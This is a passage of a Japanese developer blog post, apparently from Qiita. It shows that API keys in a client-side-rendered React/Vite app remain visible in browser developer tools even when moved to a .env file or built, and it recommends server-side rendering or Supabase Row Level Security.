class=\"p\">,</span> <span class=\"nx\">setMovies</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nf\">useState</span><span class=\"p\">([]);</span>\n<span class=\"hil\"><span class=\"o\">+ </span> <span class=\"kd\">const</span> <span class=\"nx\">apiKey</span> <span class=\"o\">=</span> <span class=\"k\">import</span><span class=\"p\">.</span><span class=\"nx\">meta</span><span class=\"p\">.</span><span class=\"nx\">env</span><span class=\"p\">.</span><span class=\"nx\">VITE_TMDB_API_TOKEN</span><span class=\"p\">;</span>\n</span>  <span class=\"kd\">const</span> <span class=\"nx\">options</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n    <span class=\"na\">method</span><span class=\"p\">:</span> <span class=\"dl\">'</span><span class=\"s1\">GET</span><span class=\"dl\">'</span><span class=\"p\">,</span>\n    <span class=\"na\">headers</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n      <span class=\"na\">accept</span><span class=\"p\">:</span> <span class=\"dl\">'</span><span class=\"s1\">application/json</span><span class=\"dl\">'</span><span class=\"p\">,</span>\n<span class=\"hil\"><span class=\"o\">+ </span>     <span class=\"na\">Authorization</span><span class=\"p\">:</span> <span class=\"s2\">`Bearer </span><span class=\"p\">${</span><span class=\"nx\">apiKey</span><span class=\"p\">}</span><span class=\"s2\">`</span><span class=\"p\">,</span>\n</span><span class=\"hdl\"><span class=\"o\">- </span>     <span class=\"na\">Authorization</span><span class=\"p\">:</span> <span class=\"dl\">'</span><span class=\"s1\">Bearer APIキー</span><span class=\"dl\">'</span><span class=\"p\">,</span>\n</span>    <span class=\"p\">},</span>\n  <span class=\"p\">};</span>\n\n  <span class=\"k\">async</span> <span class=\"kd\">function</span> <span class=\"nf\">fetchData</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">res</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nf\">fetch</span><span class=\"p\">(</span>\n      <span class=\"dl\">'</span><span class=\"s1\">https://api.themoviedb.org/3/movie/popular?language=ja-JP&amp;page=1</span><span class=\"dl\">'</span><span class=\"p\">,</span>\n      <span class=\"nx\">options</span>\n    <span class=\"p\">);</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">data</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nf\">json</span><span class=\"p\">();</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">moviesData</span> <span class=\"o\">=</span> <span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">results</span><span class=\"p\">.</span><span class=\"nf\">map</span><span class=\"p\">(</span>\n      <span class=\"p\">(</span><span class=\"nx\">movie</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"k\">new</span> <span class=\"nc\">Movie</span><span class=\"p\">(</span><span class=\"nx\">movie</span><span class=\"p\">.</span><span class=\"nx\">id</span><span class=\"p\">,</span> <span class=\"nx\">movie</span><span class=\"p\">.</span><span class=\"nx\">original_title</span><span class=\"p\">,</span> <span class=\"nx\">movie</span><span class=\"p\">.</span><span class=\"nx\">overview</span><span class=\"p\">)</span>\n    <span class=\"p\">);</span>\n    <span class=\"nf\">setMovies</span><span class=\"p\">(</span><span class=\"nx\">moviesData</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n\n  <span class=\"nf\">useEffect</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"nf\">fetchData</span><span class=\"p\">();</span>\n  <span class=\"p\">},</span> <span class=\"p\">[]);</span>\n\n  <span class=\"k\">return </span><span class=\"p\">(</span>\n    <span class=\"p\">&lt;&gt;</span>\n      <span class=\"p\">&lt;</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">className</span><span class=\"p\">=</span><span class=\"s\">\"flex sm:ml-64\"</span><span class=\"p\">&gt;</span>\n          <span class=\"p\">&lt;</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>一覧表示する<span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n          <span class=\"p\">&lt;</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n            <span class=\"si\">{</span><span class=\"nx\">movies</span><span class=\"p\">.</span><span class=\"nf\">map</span><span class=\"p\">((</span><span class=\"nx\">movie</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n              <span class=\"k\">return </span><span class=\"p\">(</span>\n                <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">key</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">movie</span><span class=\"p\">.</span><span class=\"nx\">id</span><span class=\"si\">}</span><span class=\"p\">&gt;</span>\n                  <span class=\"p\">&lt;</span><span class=\"nt\">h2</span><span class=\"p\">&gt;</span><span class=\"si\">{</span><span class=\"nx\">movie</span><span class=\"p\">.</span><span class=\"nx\">title</span><span class=\"si\">}</span><span class=\"p\">&lt;/</span><span class=\"nt\">h2</span><span class=\"p\">&gt;</span>\n                  <span class=\"p\">&lt;</span><span class=\"nt\">p</span><span class=\"p\">&gt;</span><span class=\"si\">{</span><span class=\"nx\">movie</span><span class=\"p\">.</span><span class=\"nx\">overview</span><span class=\"si\">}</span><span class=\"p\">&lt;/</span><span class=\"nt\">p</span><span class=\"p\">&gt;</span>\n                <span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n              <span class=\"p\">);</span>\n            <span class=\"p\">})</span><span class=\"si\">}</span>\n          <span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n      <span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n    <span class=\"p\">&lt;/&gt;</span>\n  <span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"k\">export</span> <span class=\"k\">default</span> <span class=\"nx\">App</span><span class=\"p\">;</span>\n</code></pre></div>\n</div>\n</details>\n<h2 data-sourcepos=\"226:1-226:25\">\n<span id=\"envに書いた結果\" class=\"fragment\"></span><a href=\"#env%E3%81%AB%E6%9B%B8%E3%81%84%E3%81%9F%E7%B5%90%E6%9E%9C\"><i class=\"fa fa-link\"></i></a>.envに書いた結果</h2>\n<p data-sourcepos=\"227:1-228:122\">Sourcesでは確認できなくなっています。.envファイルも見当たりません。<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F49112666-0c64-4131-81e1-30fcce63e4f0.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=d70e4ca296f85de4c58812f7a3accb52\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F49112666-0c64-4131-81e1-30fcce63e4f0.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=d70e4ca296f85de4c58812f7a3accb52\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F49112666-0c64-4131-81e1-30fcce63e4f0.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=75de09ee5e9a92571bfb108a4cd7d9ba 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/49112666-0c64-4131-81e1-30fcce63e4f0.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"230:1-232:122\"><strong>Networkタブでは確認ができてしまいました。</strong><br>\n<strong><code>.env</code>ファイルに定義しても確認ができてしまいます。</strong><br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fa4491e41-2d9a-4a45-af04-c2c3b8b636eb.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=c58f8adfa7de9bca8841312ae37049d2\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fa4491e41-2d9a-4a45-af04-c2c3b8b636eb.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=c58f8adfa7de9bca8841312ae37049d2\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fa4491e41-2d9a-4a45-af04-c2c3b8b636eb.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=3b4b0319e04bfca39e0174dae50afd2e 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/a4491e41-2d9a-4a45-af04-c2c3b8b636eb.png\" loading=\"lazy\"></a></p>\n<h2 data-sourcepos=\"234:1-234:73\">\n<span id=\"envはコード管理をしやすくするために定義するもの\" class=\"fragment\"></span><a href=\"#env%E3%81%AF%E3%82%B3%E3%83%BC%E3%83%89%E7%AE%A1%E7%90%86%E3%82%92%E3%81%97%E3%82%84%E3%81%99%E3%81%8F%E3%81%99%E3%82%8B%E3%81%9F%E3%82%81%E3%81%AB%E5%AE%9A%E7%BE%A9%E3%81%99%E3%82%8B%E3%82%82%E3%81%AE\"><i class=\"fa fa-link\"></i></a>.envはコード管理をしやすくするために定義するもの</h2>\n<p data-sourcepos=\"235:1-236:146\"><code>.env</code>はファイル内に<strong>URLやAPIキーなどを定義することで一元管理できます。</strong><br>\nまた、<code>.gitignore</code>で.envを定義すれば、コミットされることはなく<strong>GitHubなどに公開することを阻止できます。</strong></p>\n<p data-sourcepos=\"238:1-239:131\"><strong>.envに定義、環境変数としてtsx上で使用してもコンパイル時には実際の値が定義される</strong>ため、ブラウザ上では確認できます。<br>\n<strong>.envファイルなら環境変数で使用するから安全</strong>と最初は思っていましたが、実際は違いました。</p>\n<h1 data-sourcepos=\"241:1-241:38\">\n<span id=\"ビルドしたものでも同じ\" class=\"fragment\"></span><a href=\"#%E3%83%93%E3%83%AB%E3%83%89%E3%81%97%E3%81%9F%E3%82%82%E3%81%AE%E3%81%A7%E3%82%82%E5%90%8C%E3%81%98\"><i class=\"fa fa-link\"></i></a>ビルドしたものでも同じ？</h1>\n<p data-sourcepos=\"242:1-242:151\">え？私プロダクトをビルドしてデプロイしたもの沢山あるけど、それもキーばれている?と思い、確認しました。</p>\n<p data-sourcepos=\"244:1-244:133\"><iframe id=\"qiita-embed-content__3f68ad8bfb103eb2b58e24f7b4cf85d1\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__3f68ad8bfb103eb2b58e24f7b4cf85d1\" data-content=\"https%3A%2F%2Fstackblitz.com%2Fedit%2Fvitejs-vite-nwfvpeqa%3Ffile%3D.env%2Csrc%252FApp.tsx%2Csrc%252Fdomain%252Fmovie.ts%2Ctsconfig.node.json%2Ctsconfig.app.json\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"246:1-247:224\">先ほど作成したプロジェクトを<code>npm run build</code>でビルド<br>\nビルドをするとtsxファイルなどプロジェクト全体が一つのjsファイルにまとめられ、<code>dist</code>配下に配置、一つにまとめられたjsがブラウザで実行され、HTMLが作られます。</p>\n<p data-sourcepos=\"249:1-249:87\">そのため、jsとcss、ひな形のHTMLのみがブラウザで確認できます。</p>\n<p data-sourcepos=\"251:1-251:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F9d6d63b8-e848-416f-bdee-be4b7ac9b097.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=a0b7eef521fbb22584cbb198f072657c\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F9d6d63b8-e848-416f-bdee-be4b7ac9b097.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=a0b7eef521fbb22584cbb198f072657c\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F9d6d63b8-e848-416f-bdee-be4b7ac9b097.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=8044d51858ecc49c82f49fb5d44f87a9 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/9d6d63b8-e848-416f-bdee-be4b7ac9b097.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"254:1-254:112\"><code>npx serve dist</code>コマンドを実行し、ビルドしたものをブラウザ上で確認してみました。</p>\n<p data-sourcepos=\"256:1-257:122\">Sourcesにて、ビルドで作られた<code>index-B0le57MV.js</code>ファイルからAPIキーを簡単に見つけられました。<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F3472a209-5a32-41d9-b8e8-faa28f830422.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=6ea65916c0b90e2a8e8966d1f6833078\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F3472a209-5a32-41d9-b8e8-faa28f830422.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=6ea65916c0b90e2a8e8966d1f6833078\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F3472a209-5a32-41d9-b8e8-faa28f830422.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=6dca646d4b648fb32ba32396345c7238 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/3472a209-5a32-41d9-b8e8-faa28f830422.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"260:1-260:74\">Networkでも<code>index-B0le57MV.js</code>ファイルから確認できました。</p>\n<p data-sourcepos=\"262:1-262:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F1a95147b-7533-49a8-8fc6-66f5a1b59a30.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=73e36ada293b82a8e86040afdcfa9bb7\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F1a95147b-7533-49a8-8fc6-66f5a1b59a30.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=73e36ada293b82a8e86040afdcfa9bb7\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F1a95147b-7533-49a8-8fc6-66f5a1b59a30.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=aba842d097f16d7bdc7583a4d206cb93 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/1a95147b-7533-49a8-8fc6-66f5a1b59a30.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"264:1-264:73\"><strong>ビルドをすれば安全</strong>と考えましたが、違いました。</p>\n<p data-sourcepos=\"266:1-266:133\">これらのことから、<strong>CSRの場合はブラウザでばれてしまう恐れがある</strong>ということがわかりました。</p>\n<h1 data-sourcepos=\"268:1-268:35\">\n<span id=\"じゃあどうしたらいいの\" class=\"fragment\"></span><a href=\"#%E3%81%98%E3%82%83%E3%81%82%E3%81%A9%E3%81%86%E3%81%97%E3%81%9F%E3%82%89%E3%81%84%E3%81%84%E3%81%AE\"><i class=\"fa fa-link\"></i></a>じゃあどうしたらいいの</h1>\n<h3 data-sourcepos=\"269:1-269:34\">\n<span id=\"ssrでレンダリングする\" class=\"fragment\"></span><a href=\"#ssr%E3%81%A7%E3%83%AC%E3%83%B3%E3%83%80%E3%83%AA%E3%83%B3%E3%82%B0%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>SSRでレンダリングする</h3>\n<p data-sourcepos=\"271:1-271:87\">CSRの場合、jsファイルをブラウザ上で実行し、HTMLを作成します。</p>\n<p data-sourcepos=\"273:1-274:133\">SSRの場合、<strong>tsxや定義しているAPIキーはサーバー上で使用、HTMLを作成します。</strong><br>\nブラウザはサーバーから取得したHTMLを表示するのみのため、APIキーが見られることはありません。</p>\n<h3 data-sourcepos=\"276:1-276:61\">\n<span id=\"csrを使用しても問題ない仕組みを利用する\" class=\"fragment\"></span><a href=\"#csr%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%97%E3%81%A6%E3%82%82%E5%95%8F%E9%A1%8C%E3%81%AA%E3%81%84%E4%BB%95%E7%B5%84%E3%81%BF%E3%82%92%E5%88%A9%E7%94%A8%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>CSRを使用しても問題ない仕組みを利用する</h3>\n<h4 data-sourcepos=\"277:1-277:22\">\n<span id=\"supabaseの場合\" class=\"fragment\"></span><a href=\"#supabase%E3%81%AE%E5%A0%B4%E5%90%88\"><i class=\"fa fa-link\"></i></a>Supabaseの場合</h4>\n<p data-sourcepos=\"278:1-278:80\">これまでの勉強でSupabaseを使用する機会が多くありました。</p>\n<p data-sourcepos=\"280:1-280:59\"><iframe id=\"qiita-embed-content__2cde3027d5f8cda4c9b0f099452ebe8f\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__2cde3027d5f8cda4c9b0f099452ebe8f\" data-content=\"https%3A%2F%2Fsupabase.com%2Fdocs%2Freference%2Fjavascript%2Finitializing\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"282:1-283:177\">Supabaseのライブラリを使用する場合、APIキーを取得、指定する必要がありました。<br>\nこれまで、<code>.env</code>を作り管理していましたが、CSRでレンダリングすると、簡単にURLとシークレットキーはブラウザ上で調べられます。</p>\n<p data-sourcepos=\"285:1-285:219\">しかし、Supabaseでは、アクセスするテーブルの<code>Row Level Security (RLS)の設定</code>を<code>ENABLE</code>にすることで対策が可能です。テーブルの更新や削除を阻止することができます。</p>\n<p data-sourcepos=\"287:1-287:144\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F045a457d-0f2a-4b5b-a634-899c84432dc2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=8424363e1a23c0979020393e38704a3e\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F045a457d-0f2a-4b5b-a634-899c84432dc2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=8424363e1a23c0979020393e38704a3e\" alt=\"Pasted image 20250703085248.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F045a457d-0f2a-4b5b-a634-899c84432dc2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=daf4ab9317f7353bbc715b5e0992f8b2 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/045a457d-0f2a-4b5b-a634-899c84432dc2.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"289:1-290:80\">今まで、RLSをdisabledにすることを何となく行い、CSRでテーブルへアクセスできるようにしていました。<br>\n今回、なぜdisabledにしないといけないのかがわかりました。</p>\n<h1 data-sourcepos=\"292:1-292:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"293:1-293:164\">今回、この事象について調べてみようと思ったのは、Remix＋React-router-v7のハンズオンに取り組んだことがきっかけでした。</p>\n<p data-sourcepos=\"295:1-296:72\">Remix＋React-router-v7の場合、clientLoader→CSR、loader→SSR、SSGにしたいファイル名を定義ファイルに記載する→SSG<br>\nで簡単にレンダリング方法を変えることができます。</p>\n<p data-sourcepos=\"298:1-300:48\">最初は少し難しいなと感じたものの、メリットがわかるととても便利！と思いました。<br>\nloaderに変えるだけで、APIキーをtsxファイルに直接書いてもブラウザで確認できなくなります。（個人的にはすごい！となりました。）<br>\nぜひ、試してみてもらいたいです。</p>\n<h1 data-sourcepos=\"302:1-302:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"303:1-303:56\"><iframe id=\"qiita-embed-content__7fdc776201702bc5447a156f91eb40fc\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__7fdc776201702bc5447a156f91eb40fc\" data-content=\"https%3A%2F%2Fqiita.com%2FSicut_study%2Fitems%2F7dc1b0cdcc1bee210f05\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"305:1-305:46\"><iframe id=\"qiita-embed-content__d6ca5d86627ce23a88be4c3bc5dbb3c0\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__d6ca5d86627ce23a88be4c3bc5dbb3c0\" data-content=\"https%3A%2F%2Fzenn.dev%2Frh820%2Farticles%2F6234843d726ed3\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"307:1-307:52\"><iframe id=\"qiita-embed-content__8d0be58d712d0a09375a4a805a2b4021\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__8d0be58d712d0a09375a4a805a2b4021\" data-content=\"https%3A%2F%2Freactrouter.com%2Fstart%2Fframework%2Fdata-loading\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\n先日、`CSR`、`SSR`、`SSG`について学習していました。\nその中で、**CSRだとAPIキーやトークンがブラウザ上で確認できる**ということを知りました。\n\n私が作ったReactのプロダクトはAPIを使用しているけど、大丈夫？\n.envファイルに定義したけど、それは意味ないの？など様々な疑問が発生しました。\n\nCSRの場合、なぜ確認できてしまうのか、どのように対策したらいいのか自分なりに学んだことをまとめてみました。\n\n# CSR、SSR、SSGとは？\n今回、レンダリングについて3種類学びました。私なりに以下で理解しました。\n※詳しい解説はこちらがおすすめです。\n\nhttps://qiita.com/Sicut_study/items/7dc1b0cdcc1bee210f05\n\n\nhttps://zenn.dev/rh820/articles/6234843d726ed3\n\n### CSR：クライアントサイドレンダリング\n * ブラウザ側でHTML、DOMを作る\n * Reactのみで記載した場合はほとんどCSR\n * tsxやjsxファイルからjsを作り、そのjsが実行されることにより、ブラウザでHTMLを作ってくれる\n \n### SSR：サーバーサイドレンダリング\nサーバー側でHTMLを作る、ブラウザは取得したHTMLをもとにDOMを作成する\n\n### SSG：スタティックサイトジェネレーション\nサーバー側でHTMLを作るが、ビルド時のみ生成する。(SSRはリクエストする毎に生成する)\n\n# 実際にAPIキーが確認できるか試してみた\nAPIキーを本当に見ることができるのか、実際に試してみました。\nまずは、tsxファイル上で、URLとAPIキーを直接書いて定義し、確認してみました。\n\nhttps://stackblitz.com/edit/vitejs-vite-pw862uby?file=src%2FApp.tsx,src%2Fdomain%2Fmovies.ts&terminal=dev\n\n```App.tsx\n//　省略\n  const [movies, setMovies] = useState([]);\n  const options = {\n    method: 'GET',\n    headers: {\n      accept: 'application/json',\n      Authorization:\n        'Bearer APIキー', // APIキーを直接書いた\n    },\n  };\n\n  async function fetchData() {\n    const res = await fetch(\n      'https://api.themoviedb.org/3/movie/popular?language=ja-JP&page=1',\n      options\n    );\n    const data = await res.json();\n    const moviesData = data.results.map(\n      (movie) => new Movie(movie.id, movie.original_title, movie.overview)\n    );\n    setMovies(moviesData);\n  }\n// 以下省略\n```\n\n<details><summary><b>全量はこちら</b></summary>\n\n```App.tsx\nimport { useEffect, useState } from 'react';\nimport { Movie } from './domain/movies.ts';\nimport './App.css';\n\nfunction App() {\n  const [movies, setMovies] = useState([]);\n  const options = {\n    method: 'GET',\n    headers: {\n      accept: 'application/json',\n      Authorization:\n        'Bearer APIキー',\n    },\n  };\n\n  async function fetchData() {\n    const res = await fetch(\n      'https://api.themoviedb.org/3/movie/popular?language=ja-JP&page=1',\n      options\n    );\n    const data = await res.json();\n    const moviesData = data.results.map(\n      (movie) => new Movie(movie.id, movie.original_title, movie.overview)\n    );\n    setMovies(moviesData);\n  }\n\n  useEffect(() => {\n    fetchData();\n  }, []);\n\n  return (\n    <>\n      <div>\n        <div className=\"flex sm:ml-64\">\n          <div>一覧表示する</div>\n          <div>\n            {movies.map((movie) => {\n              return (\n                <div key={movie.id}>\n                  <h2>{movie.title}</h2>\n                  <p>{movie.overview}</p>\n                </div>\n              );\n            })}\n          </div>\n        </div>\n      </div>\n    </>\n  );\n}\n\nexport default App;\n\n```\n\n</details>\n\n## 直接書いた結果\n開発者ツールよりSourcesを確認\n`Authorization : Bearer ~`の箇所がAPIキーになります。簡単に確認できました。\n**誰でも簡単にAPIキーを取得することができます。**\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/439428b8-d901-477b-b2fb-86a557b37a1e.png)\n\nNetworkからも確認できます。\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/94cc0033-4d62-4436-b538-dba33dc6250f.png)\n\n# .envファイルに環境変数で設定していれば大丈夫…？\nAPIを使用するときは、URLやAPIキーを、`.env`ファイルに定義しています。\n\nここで以下の疑問や考えがでてきました。\n1. App.tsx上に定義すると、tsxファイルを元にjsファイルを作成、\nそれを元にブラウザでHTMLを作るから、確認できてしまう\n2. .envファイルは別ファイルに定義して、定義した環境変数をtsx上で使用している\n3. そこから、.envファイルは直接定義するのを阻止するためにある？と疑問に思いました。\n\n`.env`ファイルに定義して確認してみました。\n\nhttps://stackblitz.com/edit/vitejs-vite-xg3cryb8?file=src%2FApp.tsx,src%2Fdomain%2Fmovie.ts,.env\n\n```diff_tsx:App.tsx\n// 省略\n  const [movies, setMovies] = useState([]);\n+  const apiKey = import.meta.env.VITE_TMDB_API_TOKEN;\n  const options = {\n    method: 'GET',\n    headers: {\n      accept: 'application/json',\n+      Authorization: `Bearer ${apiKey}`,\n-      Authorization: 'Bearer APIキー',\n    },\n  };\n\n// 省略\n```\n\n```.env\nVITE_TMDB_API_TOKEN=APIキー\n```\n\n<details><summary><b>App.tsxの全量はこちら</b></summary>\n\n```diff_tsx:App.tsx\nimport { useEffect, useState } from 'react';\nimport { Movie } from './domain/movie.ts';\nimport './App.css';\n\nfunction App() {\n  const [movies, setMovies] = useState([]);\n+  const apiKey = import.meta.env.VITE_TMDB_API_TOKEN;\n  const options = {\n    method: 'GET',\n    headers: {\n      accept: 'application/json',\n+      Authorization: `Bearer ${apiKey}`,\n-      Authorization: 'Bearer APIキー',\n    },\n  };\n\n  async function fetchData() {\n    const res = await fetch(\n      'https://api.themoviedb.org/3/movie/popular?language=ja-JP&page=1',\n      options\n    );\n    const data = await res.json();\n    const moviesData = data.results.map(\n      (movie) => new Movie(movie.id, movie.original_title, movie.overview)\n    );\n    setMovies(moviesData);\n  }\n\n  useEffect(() => {\n    fetchData();\n  }, []);\n\n  return (\n    <>\n      <div>\n        <div className=\"flex sm:ml-64\">\n          <div>一覧表示する</div>\n          <div>\n            {movies.map((movie) => {\n              return (\n                <div key={movie.id}>\n                  <h2>{movie.title}</h2>\n                  <p>{movie.overview}</p>\n                </div>\n              );\n            })}\n          </div>\n        </div>\n      </div>\n    </>\n  );\n}\n\nexport default App;\n```\n</details>\n\n## .envに書いた結果\nSourcesでは確認できなくなっています。.envファイルも見当たりません。\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/49112666-0c64-4131-81e1-30fcce63e4f0.png)\n\n**Networkタブでは確認ができてしまいました。**\n**`.env`ファイルに定義しても確認ができてしまいます。**\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/a4491e41-2d9a-4a45-af04-c2c3b8b636eb.png)\n\n## 